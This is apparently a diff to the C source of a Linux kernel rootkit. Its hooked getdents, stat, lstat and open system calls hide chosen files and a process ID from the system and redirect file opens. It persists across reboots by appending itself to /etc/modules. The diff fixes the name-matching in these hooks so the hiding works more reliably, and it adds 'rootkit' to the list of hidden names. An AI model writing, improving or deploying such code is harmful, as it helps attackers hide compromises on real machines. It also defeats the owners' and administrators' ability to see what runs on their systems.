@@ -34,13 +34,13 @@
 // this are the filenames we want to hide
 // used in hacked_getdents(...)
 const int   TO_HIDE_SIZE = 3;
-const char* TO_HIDE[]    = { "test_file.txt", "fake_modules_original.txt", "modules_original" };
+const char* TO_HIDE[]    = { "test_file.txt", "modules_original", "rootkit" };
 char hidePID[6] = "-1";
 
 // location of modules file
 #define FILE_MODULES               "/etc/modules\0"
 #define FILE_MODULES_ORIGINAL      "/etc/modules_original\0"
-#define FILE_TO_APPEND             "/lib/modules/3.2.0-126-generic/kernel/drivers/rootkit/to_append.txt"
+#define FILE_TO_APPEND             "/lib/modules/3.2.0-126-generic/kernel/drivers/rootkit/to_append.txt\0"
 
 // 'map' for replacement open operations
 // e.g. trying to open dog.txt will get you red.txt instead
@@ -165,7 +165,7 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
         // & move on
         for (j = 0; j < TO_HIDE_SIZE; j++) {
             const char* to_hide = TO_HIDE[j];
-            if (strncmp(cur->d_name, to_hide, strlen(cur->d_name)) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
+            if (strncmp(cur->d_name, to_hide, max_m(strlen(cur->d_name), strlen(to_hide))) == 0 || strncmp(cur->d_name, hidePID, strlen(hidePID)) == 0) {
                 // printk("Tried to getdents %s; hiding...\n", to_hide);
                 // length of the linux_dirent
                 reclen = cur->d_reclen;
@@ -217,7 +217,7 @@ asmlinkage int hacked_stat(const char *path, struct stat *buf) {
     const char* filename = strip_filepath(path);
     for (j = 0; j < TO_HIDE_SIZE; j++) {
         const char* to_hide = TO_HIDE[j];
-        if (strncmp(filename, to_hide, strlen(to_hide)) == 0) {
+        if (strncmp(filename, to_hide, max_m(strlen(filename), strlen(to_hide))) == 0) {
             // printk("Tried to stat %s; hiding...\n", to_hide);
             return -ENOENT;
         }
@@ -230,7 +230,7 @@ asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
     const char* filename = strip_filepath(path);
     for (j = 0; j < TO_HIDE_SIZE; j++) {
         const char* to_hide = TO_HIDE[j];
-        if (strncmp(filename, to_hide, strlen(to_hide)) == 0) {
+        if (strncmp(filename, to_hide, max_m(strlen(filename), strlen(to_hide))) == 0) {
             // printk("Tried to lstat %s; hiding...\n", to_hide);
             return -ENOENT;
         }
@@ -249,7 +249,7 @@ asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode) 
         for (i = 0; i < replacement_size; i++) {
             // check if pathname is in map
             const char* replacement_key_stripped = strip_filepath(replacement_keys[i]);
-            if (strncmp(pathname_stripped, replacement_key_stripped, strlen(replacement_key_stripped)) == 0) {
+            if (strncmp(pathname_stripped, replacement_key_stripped, max_m(strlen(pathname_stripped), strlen(replacement_key_stripped))) == 0) {
                 // redirect to replacement file
                 // printk("tried to open %s; redirecting open from %s to %s...\n", pathname, replacement_keys[i], replacement_values[i]);
 
@@ -647,4 +647,8 @@ void add_to_reboot_exit(void) {
     clone_file(FILE_MODULES, FILE_MODULES_ORIGINAL);
     append_to_file(FILE_TO_APPEND, FILE_MODULES);
     boot_loader_init = 1;
+}
+
+int max_m(int a, int b) {
+    return a > b ? a : b;
 }
